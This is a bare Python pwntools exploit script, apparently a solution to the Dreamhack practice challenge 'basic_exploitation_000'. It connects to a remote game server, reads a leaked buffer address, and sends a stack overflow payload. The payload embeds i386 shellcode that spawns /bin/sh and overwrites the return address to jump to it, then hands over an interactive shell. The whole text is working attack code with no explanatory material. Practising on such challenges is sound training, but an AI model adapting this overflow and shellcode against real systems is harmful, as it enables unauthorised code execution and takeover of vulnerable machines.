from pwn import *

context(arch='i386', os='linux')
elf = ELF("./basic_exploitation_000")
context.log_level = 'error' #
context.log_level = 'debug' #
context.log_level = 'info' #

shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"

#p = process("./basic_exploitation_000")
p = remote('host1.dreamhack.games', 15634)

pay = b"A" * 0x14 + shellcode + b"A" * 0x52 + b"B" * 0x4
p.recvuntil("buf = (")
buf = int(p.recv(10), 16)
p.recvline()
shell_addr = buf
print("shellcode address is: ", p32(shell_addr))
pay += p32(shell_addr)
p.sendline(pay)
p.interactive()
